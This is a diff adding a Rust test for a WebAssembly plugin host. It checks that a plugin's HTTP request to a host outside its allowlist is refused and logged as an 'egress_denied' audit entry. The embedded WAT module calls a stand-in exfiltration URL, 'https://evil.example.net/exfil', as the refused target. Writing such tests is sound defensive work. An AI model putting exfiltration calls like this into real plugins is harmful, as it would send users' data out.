@@ -8,6 +8,7 @@ use std::sync::Arc;
 use concerto_api_types::plugin::CapabilityRequest;
 use concerto_plugins::capability::{
     CapabilityDiscriminant, CapabilityManager, CapabilityScope, GrantedCapabilities,
+    RULE_EGRESS_ALLOWLIST,
 };
 use concerto_plugins::guest_abi::*;
 use concerto_plugins::host::{PluginHost, PluginStoreData, ScratchBuffer};
@@ -1332,6 +1333,128 @@ async fn completion_without_provider_returns_error() {
     assert!(
         err_msg.contains("no LLM provider"),
         "error should mention missing provider, got: {err_msg}"
+    );
+}
+
+// ---------------------------------------------------------------------------
+// Network egress filtering (threat model §6 gap #7)
+// ---------------------------------------------------------------------------
+
+/// WAT module that imports `concerto.http_get` and exports `test_http_get`
+/// against a hard-coded URL whose host is NOT on the grant's egress
+/// allowlist. The refusal happens before any socket is opened, so the test
+/// needs no network.
+const HTTP_EGRESS_TEST_WAT: &str = r#"
+(module
+  (import "concerto" "http_get" (func $host_http_get (param i32 i32 i32 i32) (result i64)))
+  (memory (export "memory") 2)
+  (global (export "scratch_buffer") (mut i32) (i32.const 0))
+  (global (export "scratch_buffer_size") i32 (i32.const 65536))
+  ;; Manifest at offset 0 (139 bytes)
+  (data (i32.const 0) "{\"id\":\"egress-test\",\"name\":\"Egress Test\",\"version\":\"0.1.0\",\"description\":\"egress\",\"abi_version\":1,\"capabilities_required\":[],\"provides\":[]}")
+  ;; Target URL at offset 512 (30 bytes) — a host absent from the allowlist.
+  (data (i32.const 512) "https://evil.example.net/exfil")
+  (func (export "manifest") (result i64)
+    (i64.or
+      (i64.shl (i64.const 0) (i64.const 32))
+      (i64.const 139)
+    )
+  )
+  (func (export "init") (result i32)
+    i32.const 0
+  )
+  (func (export "test_http_get") (result i64)
+    (call $host_http_get
+      (i32.const 512)
+      (i32.const 30)
+      (i32.const 0)
+      (i32.const 65536)
+    )
+  )
+)
+"#;
+
+/// Audit sink that forwards infra rows to a channel so a test can wait for
+/// the row it cares about instead of racing detached writes.
+struct ChannelAudit(
+    tokio::sync::mpsc::UnboundedSender<concerto_core::traits::policy::InfraAuditEntry>,
+);
+
+#[async_trait::async_trait]
+impl concerto_core::traits::policy::AuditLog for ChannelAudit {
+    async fn record(
+        &self,
+        _entry: concerto_core::traits::policy::AuditEntry,
+        _cancel: concerto_core::CancellationToken,
+    ) -> Result<(), concerto_core::error::PolicyError> {
+        Ok(())
+    }
+
+    async fn record_infra(
+        &self,
+        entry: concerto_core::traits::policy::InfraAuditEntry,
+        _cancel: concerto_core::CancellationToken,
+    ) -> Result<(), concerto_core::error::PolicyError> {
+        let _ = self.0.send(entry);
+        Ok(())
+    }
+}
+
+/// A refused plugin egress attempt must (a) never reach the network and
+/// (b) land an `egress_denied` infra audit row whose detail names the rule
+/// that refused it and the target the plugin tried to reach.
+#[tokio::test]
+async fn egress_denied_writes_audit_row() {
+    use concerto_core::traits::policy::InfraAuditEntry;
+
+    let host = test_host();
+    let wasm = compile_wat(HTTP_EGRESS_TEST_WAT);
+    let loader = PluginLoader::new(host);
+    let loaded =
+        loader.load_from_bytes(&wasm, Path::new("egress.wasm")).await.expect("load should succeed");
+    assert_eq!(loaded.manifest.id, "egress-test");
+
+    // Grant NetworkOutbound with an allowlist that deliberately does NOT
+    // cover the URL hard-coded in the WAT module.
+    let mut caps = GrantedCapabilities::new();
+    caps.grant_session(
+        CapabilityDiscriminant::NetworkOutbound,
+        CapabilityScope { domains: vec!["https://api.example.com".into()], ..Default::default() },
+    );
+    let mut plugin = loader.initialise(&loaded, caps).await.expect("init should succeed");
+
+    let (tx, mut rx) = tokio::sync::mpsc::unbounded_channel::<InfraAuditEntry>();
+    plugin.store.data_mut().audit_log = Some(Arc::new(ChannelAudit(tx)));
+
+    let func = plugin
+        .instance
+        .get_typed_func::<(), i64>(&mut plugin.store, "test_http_get")
+        .expect("test_http_get export should exist");
+    let result = func.call_async(&mut plugin.store, ()).await;
+    assert!(result.is_err(), "a non-listed host must be refused before any I/O");
+
+    // The row is written from a detached task, so wait for it rather than
+    // asserting immediately; the bound only guards against a hang.
+    let row = tokio::time::timeout(std::time::Duration::from_secs(5), async {
+        loop {
+            let row = rx.recv().await.expect("audit sink must stay open");
+            if row.error_kind.as_deref() == Some("egress_denied") {
+                return row;
+            }
+        }
+    })
+    .await
+    .expect("egress_denied audit row should be written on deny");
+
+    assert_eq!(row.verdict.to_string(), "CapabilityDenied");
+    let detail = row.detail.as_deref().unwrap_or_default();
+    assert!(
+        detail.contains(RULE_EGRESS_ALLOWLIST),
+        "audit detail must name the rule, got: {detail}"
+    );
+    assert!(
+        detail.contains("evil.example.net"),
+        "audit detail must name the target, got: {detail}"
     );
 }
 
